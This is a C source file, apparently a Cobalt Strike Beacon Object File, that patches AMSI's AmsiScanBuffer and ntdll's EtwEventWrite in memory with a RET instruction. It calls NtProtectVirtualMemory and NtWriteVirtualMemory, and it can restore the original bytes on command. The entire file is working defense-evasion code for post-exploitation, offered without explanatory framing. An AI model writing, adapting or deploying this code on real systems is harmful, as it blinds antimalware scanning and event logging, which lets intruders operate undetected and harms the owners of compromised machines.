#include <windows.h>
#include "beacon.h"

NTSYSAPI NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);

void ApplyPatch(void* target, unsigned char* data, size_t sz, char* msg) {
    if (!target) return;

    ULONG old;
    SIZE_T u_sz = sz;
    void* base = target;

    if (NTDLL$NtProtectVirtualMemory((HANDLE)-1, &base, (PULONG)&u_sz, 0x04, &old) == 0) {
        NTDLL$NtWriteVirtualMemory((HANDLE)-1, target, (PVOID)data, sz, NULL);
        NTDLL$NtProtectVirtualMemory((HANDLE)-1, &base, (PULONG)&u_sz, old, &old);
        BeaconPrintf(0, msg);
    }
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);

    void* p_amsi = (void*)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    void* p_etw = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    unsigned char p_ret[] = { 0xC3 };
    unsigned char o_amsi[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };
    unsigned char o_etw[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };

    if (cmd == 1)      ApplyPatch(p_amsi, p_ret, sizeof(p_ret), "[+] AMSI Patched.");
    else if (cmd == 2) ApplyPatch(p_amsi, o_amsi, sizeof(o_amsi), "[+] AMSI Restored.");
    else if (cmd == 3) ApplyPatch(p_etw, p_ret, sizeof(p_ret), "[+] ETW Patched.");
    else if (cmd == 4) ApplyPatch(p_etw, o_etw, sizeof(o_etw), "[+] ETW Restored.");
}
